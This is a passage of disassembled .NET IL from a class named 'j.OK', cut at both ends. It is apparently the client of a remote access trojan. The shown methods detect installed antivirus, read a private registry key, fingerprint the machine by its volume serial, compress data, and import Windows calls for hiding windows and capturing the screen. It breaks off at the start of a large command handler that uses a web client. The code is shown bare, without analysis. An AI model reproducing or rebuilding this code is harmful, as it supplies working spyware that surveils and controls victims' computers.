      IL_00b3:  newarr     [mscorlib]System.Object
      IL_00b8:  ldnull
      IL_00b9:  ldnull
      IL_00ba:  ldnull
      IL_00bb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00c0:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_00c5:  stloc.0
      IL_00c6:  leave.s    IL_0142

      IL_00c8:  ldc.i4.7
      IL_00c9:  stloc.3
      IL_00ca:  ldloc.s    V_9
      IL_00cc:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00d1:  brtrue.s   IL_008e

      IL_00d3:  ldloc.s    V_9
      IL_00d5:  isinst     [mscorlib]System.IDisposable
      IL_00da:  brfalse.s  IL_00e8

      IL_00dc:  ldloc.s    V_9
      IL_00de:  isinst     [mscorlib]System.IDisposable
      IL_00e3:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e8:  ldc.i4.8
      IL_00e9:  stloc.3
      IL_00ea:  ldstr      "No AV"
      IL_00ef:  stloc.0
      IL_00f0:  leave.s    IL_0142

      IL_00f2:  ldc.i4.0
      IL_00f3:  stloc.1
      IL_00f4:  ldloc.1
      IL_00f5:  ldc.i4.1
      IL_00f6:  add.ovf
      IL_00f7:  stloc.s    V_11
      IL_00f9:  ldloc.s    V_11
      IL_00fb:  ldc.i4.1
      IL_00fc:  sub
      IL_00fd:  switch     ( 
                            IL_0000,
                            IL_0009,
                            IL_0022,
                            IL_007c,
                            IL_00a1,
                            IL_00a3,
                            IL_00c8,
                            IL_00e8,
                            IL_0126)
      IL_0126:  leave.s    IL_0142

      IL_0128:  ldloc.3
      IL_0129:  stloc.1
      IL_012a:  ldloc.2
      IL_012b:  brfalse.s  IL_0131

      IL_012d:  ldloc.2
      IL_012e:  ldc.i4.1
      IL_012f:  beq.s      IL_00f2

      IL_0131:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0133:  dup
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0139:  stloc.s    V_12
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0128

    }  // end handler
    IL_0142:  ldloc.1
    IL_0143:  pop
    IL_0144:  ldloc.0
    IL_0145:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0034:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0039:  stloc.0
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  ldloc.1
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  ldarg.1
      IL_004a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004f:  stloc.0
      IL_0050:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             int32 V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.2
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    V_4
      IL_0007:  ldnull
      IL_0008:  stloc.s    V_5
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_6
      IL_0020:  ldloca.s   V_6
      IL_0022:  ldloca.s   V_2
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_1
      IL_0027:  ldloca.s   V_3
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_5
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003a:  stloc.0
      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_7
      IL_0045:  ldloc.s    V_7
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  ldstr      "ERR"
      IL_0051:  stloc.0
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" winapi) 
          int32  mciSendString(string command,
                               string buffer,
                               int32 bufferSize,
                               native int hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  marshal( bool)  ReleaseDC(native int hWnd,
                                          native int hDC) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          native int  CreateSolidBrush(uint32 crColor) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  PatBlt(native int hdc,
                       int32 nXLeft,
                       int32 nYLeft,
                       int32 nWidth,
                       int32 nHeight,
                       valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("gdi32.dll" nomangle unicode lasterr stdcall) 
          object  BitBlt(native int hdcDest,
                         int32 nXDest,
                         int32 nYDest,
                         int32 nWidth,
                         int32 nHeight,
                         native int hdcSrc,
                         int32 nXSrc,
                         int32 nYSrc,
                         int32 dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  StretchBlt(native int hdcDest,
                           int32 nXOriginDest,
                           int32 nYOriginDest,
                           int32 nWidthDest,
                           int32 nHeightDest,
                           native int hdcSrc,
                           int32 nXOriginSrc,
                           int32 nYOriginSrc,
                           int32 nWidthSrc,
                           int32 nHeightSrc,
                           valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetDesktopWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetWindowDC(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          native int  SelectObject(native int hdc,
                                   native int hgdiobj) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          bool  DeleteObject(native int objectHandle) cil managed preservesig
  {
  }
  .method public static uint8[]  ZIP(uint8[] B,
                                     bool& CM) cil managed
  {
    // Code size       774 (0x306)
    .maxstack  13
    .locals init (uint8[] V_0,
             object V_1,
             object V_2,
             uint8[] V_3,
             object[] V_4,
             bool[] V_5,
             object V_6,
             object V_7,
             uint8[] V_8,
             int32 V_9,
             uint8[] V_10)
    IL_0000:  ldarg.1
    IL_0001:  ldind.u1
    IL_0002:  brfalse    IL_0154

    IL_0007:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000c:  stloc.1
    IL_000d:  ldloc.1
    IL_000e:  castclass  [mscorlib]System.IO.Stream
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.1
    IL_0015:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode,
                                                                                       bool)
    IL_001a:  stloc.2
    IL_001b:  ldloc.2
    IL_001c:  ldnull
    IL_001d:  ldstr      "Write"
    IL_0022:  ldc.i4.3
    IL_0023:  newarr     [mscorlib]System.Object
    IL_0028:  dup
    IL_0029:  ldc.i4.0
    IL_002a:  ldarg.0
    IL_002b:  stelem.ref
    IL_002c:  dup
    IL_002d:  ldc.i4.1
    IL_002e:  ldc.i4.0
    IL_002f:  box        [mscorlib]System.Int32
    IL_0034:  stelem.ref
    IL_0035:  dup
    IL_0036:  ldc.i4.2
    IL_0037:  ldarg.0
    IL_0038:  ldlen
    IL_0039:  conv.i4
    IL_003a:  box        [mscorlib]System.Int32
    IL_003f:  stelem.ref
    IL_0040:  dup
    IL_0041:  stloc.s    V_4
    IL_0043:  ldnull
    IL_0044:  ldnull
    IL_0045:  ldc.i4.3
    IL_0046:  newarr     [mscorlib]System.Boolean
    IL_004b:  dup
    IL_004c:  ldc.i4.0
    IL_004d:  ldc.i4.1
    IL_004e:  stelem.i1
    IL_004f:  dup
    IL_0050:  stloc.s    V_5
    IL_0052:  ldc.i4.1
    IL_0053:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0058:  pop
    IL_0059:  ldloc.s    V_5
    IL_005b:  ldc.i4.0
    IL_005c:  ldelem.u1
    IL_005d:  brfalse.s  IL_007e

    IL_005f:  ldloc.s    V_4
    IL_0061:  ldc.i4.0
    IL_0062:  ldelem.ref
    IL_0063:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0068:  ldtoken    uint8[]
    IL_006d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0072:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0077:  castclass  uint8[]
    IL_007c:  starg.s    B
    IL_007e:  ldloc.2
    IL_007f:  ldnull
    IL_0080:  ldstr      "Dispose"
    IL_0085:  ldc.i4.0
    IL_0086:  newarr     [mscorlib]System.Object
    IL_008b:  ldnull
    IL_008c:  ldnull
    IL_008d:  ldnull
    IL_008e:  ldc.i4.1
    IL_008f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0094:  pop
    IL_0095:  ldloc.1
    IL_0096:  ldnull
    IL_0097:  ldstr      "Position"
    IL_009c:  ldc.i4.1
    IL_009d:  newarr     [mscorlib]System.Object
    IL_00a2:  dup
    IL_00a3:  ldc.i4.0
    IL_00a4:  ldc.i4.0
    IL_00a5:  box        [mscorlib]System.Int32
    IL_00aa:  stelem.ref
    IL_00ab:  ldnull
    IL_00ac:  ldnull
    IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00b2:  ldloc.1
    IL_00b3:  ldnull
    IL_00b4:  ldstr      "Length"
    IL_00b9:  ldc.i4.0
    IL_00ba:  newarr     [mscorlib]System.Object
    IL_00bf:  ldnull
    IL_00c0:  ldnull
    IL_00c1:  ldnull
    IL_00c2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_00c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
    IL_00cc:  ldc.i4.1
    IL_00cd:  add.ovf
    IL_00ce:  newarr     [mscorlib]System.Byte
    IL_00d3:  stloc.3
    IL_00d4:  ldloc.1
    IL_00d5:  ldnull
    IL_00d6:  ldstr      "Read"
    IL_00db:  ldc.i4.3
    IL_00dc:  newarr     [mscorlib]System.Object
    IL_00e1:  dup
    IL_00e2:  ldc.i4.0
    IL_00e3:  ldloc.3
    IL_00e4:  stelem.ref
    IL_00e5:  dup
    IL_00e6:  ldc.i4.1
    IL_00e7:  ldc.i4.0
    IL_00e8:  box        [mscorlib]System.Int32
    IL_00ed:  stelem.ref
    IL_00ee:  dup
    IL_00ef:  ldc.i4.2
    IL_00f0:  ldloc.3
    IL_00f1:  ldlen
    IL_00f2:  conv.i4
    IL_00f3:  box        [mscorlib]System.Int32
    IL_00f8:  stelem.ref
    IL_00f9:  dup
    IL_00fa:  stloc.s    V_4
    IL_00fc:  ldnull
    IL_00fd:  ldnull
    IL_00fe:  ldc.i4.3
    IL_00ff:  newarr     [mscorlib]System.Boolean
    IL_0104:  dup
    IL_0105:  ldc.i4.0
    IL_0106:  ldc.i4.1
    IL_0107:  stelem.i1
    IL_0108:  dup
    IL_0109:  stloc.s    V_5
    IL_010b:  ldc.i4.1
    IL_010c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0111:  pop
    IL_0112:  ldloc.s    V_5
    IL_0114:  ldc.i4.0
    IL_0115:  ldelem.u1
    IL_0116:  brfalse.s  IL_0136

    IL_0118:  ldloc.s    V_4
    IL_011a:  ldc.i4.0
    IL_011b:  ldelem.ref
    IL_011c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0121:  ldtoken    uint8[]
    IL_0126:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_012b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0130:  castclass  uint8[]
    IL_0135:  stloc.3
    IL_0136:  ldloc.1
    IL_0137:  ldnull
    IL_0138:  ldstr      "Dispose"
    IL_013d:  ldc.i4.0
    IL_013e:  newarr     [mscorlib]System.Object
    IL_0143:  ldnull
    IL_0144:  ldnull
    IL_0145:  ldnull
    IL_0146:  ldc.i4.1
    IL_0147:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_014c:  pop
    IL_014d:  ldloc.3
    IL_014e:  stloc.0
    IL_014f:  br         IL_0304

    IL_0154:  ldarg.0
    IL_0155:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_015a:  stloc.s    V_6
    IL_015c:  ldloc.s    V_6
    IL_015e:  castclass  [mscorlib]System.IO.Stream
    IL_0163:  ldc.i4.0
    IL_0164:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0169:  stloc.s    V_7
    IL_016b:  ldc.i4.4
    IL_016c:  newarr     [mscorlib]System.Byte
    IL_0171:  stloc.s    V_8
    IL_0173:  ldloc.s    V_6
    IL_0175:  ldnull
    IL_0176:  ldstr      "Position"
    IL_017b:  ldc.i4.1
    IL_017c:  newarr     [mscorlib]System.Object
    IL_0181:  dup
    IL_0182:  ldc.i4.0
    IL_0183:  ldloc.s    V_6
    IL_0185:  ldnull
    IL_0186:  ldstr      "Length"
    IL_018b:  ldc.i4.0
    IL_018c:  newarr     [mscorlib]System.Object
    IL_0191:  ldnull
    IL_0192:  ldnull
    IL_0193:  ldnull
    IL_0194:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_0199:  ldc.i4.5
    IL_019a:  box        [mscorlib]System.Int32
    IL_019f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::SubtractObject(object,
                                                                                                                        object)
    IL_01a4:  stelem.ref
    IL_01a5:  ldnull
    IL_01a6:  ldnull
    IL_01a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_01ac:  ldloc.s    V_6
    IL_01ae:  ldnull
    IL_01af:  ldstr      "Read"
    IL_01b4:  ldc.i4.3
    IL_01b5:  newarr     [mscorlib]System.Object
    IL_01ba:  dup
    IL_01bb:  ldc.i4.0
    IL_01bc:  ldloc.s    V_8
    IL_01be:  stelem.ref
    IL_01bf:  dup
    IL_01c0:  ldc.i4.1
    IL_01c1:  ldc.i4.0
    IL_01c2:  box        [mscorlib]System.Int32
    IL_01c7:  stelem.ref
    IL_01c8:  dup
    IL_01c9:  ldc.i4.2
    IL_01ca:  ldc.i4.4
    IL_01cb:  box        [mscorlib]System.Int32
    IL_01d0:  stelem.ref
    IL_01d1:  dup
    IL_01d2:  stloc.s    V_4
    IL_01d4:  ldnull
    IL_01d5:  ldnull
    IL_01d6:  ldc.i4.3
    IL_01d7:  newarr     [mscorlib]System.Boolean
    IL_01dc:  dup
    IL_01dd:  ldc.i4.0
    IL_01de:  ldc.i4.1
    IL_01df:  stelem.i1
    IL_01e0:  dup
    IL_01e1:  stloc.s    V_5
    IL_01e3:  ldc.i4.1
    IL_01e4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_01e9:  pop
    IL_01ea:  ldloc.s    V_5
    IL_01ec:  ldc.i4.0
    IL_01ed:  ldelem.u1
    IL_01ee:  brfalse.s  IL_020f

    IL_01f0:  ldloc.s    V_4
    IL_01f2:  ldc.i4.0
    IL_01f3:  ldelem.ref
    IL_01f4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_01f9:  ldtoken    uint8[]
    IL_01fe:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0203:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0208:  castclass  uint8[]
    IL_020d:  stloc.s    V_8
    IL_020f:  ldloc.s    V_8
    IL_0211:  ldc.i4.0
    IL_0212:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0217:  stloc.s    V_9
    IL_0219:  ldloc.s    V_6
    IL_021b:  ldnull
    IL_021c:  ldstr      "Position"
    IL_0221:  ldc.i4.1
    IL_0222:  newarr     [mscorlib]System.Object
    IL_0227:  dup
    IL_0228:  ldc.i4.0
    IL_0229:  ldc.i4.0
    IL_022a:  box        [mscorlib]System.Int32
    IL_022f:  stelem.ref
    IL_0230:  ldnull
    IL_0231:  ldnull
    IL_0232:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_0237:  ldloc.s    V_9
    IL_0239:  ldc.i4.1
    IL_023a:  sub.ovf
    IL_023b:  ldc.i4.1
    IL_023c:  add.ovf
    IL_023d:  newarr     [mscorlib]System.Byte
    IL_0242:  stloc.s    V_10
    IL_0244:  ldloc.s    V_7
    IL_0246:  ldnull
    IL_0247:  ldstr      "Read"
    IL_024c:  ldc.i4.3
    IL_024d:  newarr     [mscorlib]System.Object
    IL_0252:  dup
    IL_0253:  ldc.i4.0
    IL_0254:  ldloc.s    V_10
    IL_0256:  stelem.ref
    IL_0257:  dup
    IL_0258:  ldc.i4.1
    IL_0259:  ldc.i4.0
    IL_025a:  box        [mscorlib]System.Int32
    IL_025f:  stelem.ref
    IL_0260:  dup
    IL_0261:  ldc.i4.2
    IL_0262:  ldloc.s    V_9
    IL_0264:  box        [mscorlib]System.Int32
    IL_0269:  stelem.ref
    IL_026a:  dup
    IL_026b:  stloc.s    V_4
    IL_026d:  ldnull
    IL_026e:  ldnull
    IL_026f:  ldc.i4.3
    IL_0270:  newarr     [mscorlib]System.Boolean
    IL_0275:  dup
    IL_0276:  ldc.i4.0
    IL_0277:  ldc.i4.1
    IL_0278:  stelem.i1
    IL_0279:  dup
    IL_027a:  ldc.i4.2
    IL_027b:  ldc.i4.1
    IL_027c:  stelem.i1
    IL_027d:  dup
    IL_027e:  stloc.s    V_5
    IL_0280:  ldc.i4.1
    IL_0281:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0286:  pop
    IL_0287:  ldloc.s    V_5
    IL_0289:  ldc.i4.0
    IL_028a:  ldelem.u1
    IL_028b:  brfalse.s  IL_02ac

    IL_028d:  ldloc.s    V_4
    IL_028f:  ldc.i4.0
    IL_0290:  ldelem.ref
    IL_0291:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0296:  ldtoken    uint8[]
    IL_029b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02a0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_02a5:  castclass  uint8[]
    IL_02aa:  stloc.s    V_10
    IL_02ac:  ldloc.s    V_5
    IL_02ae:  ldc.i4.2
    IL_02af:  ldelem.u1
    IL_02b0:  brfalse.s  IL_02d1

    IL_02b2:  ldloc.s    V_4
    IL_02b4:  ldc.i4.2
    IL_02b5:  ldelem.ref
    IL_02b6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_02bb:  ldtoken    [mscorlib]System.Int32
    IL_02c0:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_02ca:  unbox.any  [mscorlib]System.Int32
    IL_02cf:  stloc.s    V_9
    IL_02d1:  ldloc.s    V_7
    IL_02d3:  ldnull
    IL_02d4:  ldstr      "Dispose"
    IL_02d9:  ldc.i4.0
    IL_02da:  newarr     [mscorlib]System.Object
    IL_02df:  ldnull
    IL_02e0:  ldnull
    IL_02e1:  ldnull
    IL_02e2:  ldc.i4.1
    IL_02e3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_02e8:  pop
    IL_02e9:  ldloc.s    V_6
    IL_02eb:  ldnull
    IL_02ec:  ldstr      "Dispose"
    IL_02f1:  ldc.i4.0
    IL_02f2:  newarr     [mscorlib]System.Object
    IL_02f7:  ldnull
    IL_02f8:  ldnull
    IL_02f9:  ldnull
    IL_02fa:  ldc.i4.1
    IL_02fb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0300:  pop
    IL_0301:  ldloc.s    V_10
    IL_0303:  stloc.0
    IL_0304:  ldloc.0
    IL_0305:  ret
  } // end of method OK::ZIP

  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       6890 (0x1aea)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             string[] V_3,
             class [System]System.Net.WebClient V_4,
             string V_5,
             uint8[] V_6,
             class [System]System.Net.WebClient V_7,
             string V_8,
             uint32 V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             native int V_12,
             int32 V_13,
             int32 V_14,
             valuetype [System.Drawing]System.Drawing.Rectangle V_15,
             native int V_16,
             int32 V_17,
             int32 V_18,
             native int V_19,
             int32 V_20,
             int32 V_21,
             native int V_22,
             int32 V_23,
             int32 V_24,
             native int V_25,
             int32 V_26,
             int32 V_27,
             native int V_28,
             int32 V_29,
             int32 V_30,
             valuetype [mscorlib]System.Guid V_31,
             class [mscorlib]System.Exception V_32,
             int32 V_33,
             int32 V_34,
             native int V_35,
             uint8[] V_36,
             string V_37,
             bool V_38,
             class [mscorlib]System.Exception V_39,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_40,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_41,
             string V_42,
             string V_43,
             string V_44,
             int32 V_45,
             class [mscorlib]System.Exception V_46,
             class [mscorlib]System.Exception V_47,
             class [mscorlib]System.Exception V_48,
             class [mscorlib]System.Exception V_49,
             uint8[] V_50,
             object V_51,
             class [mscorlib]System.IO.MemoryStream V_52,
             int32 V_53,
             uint8[] V_54,
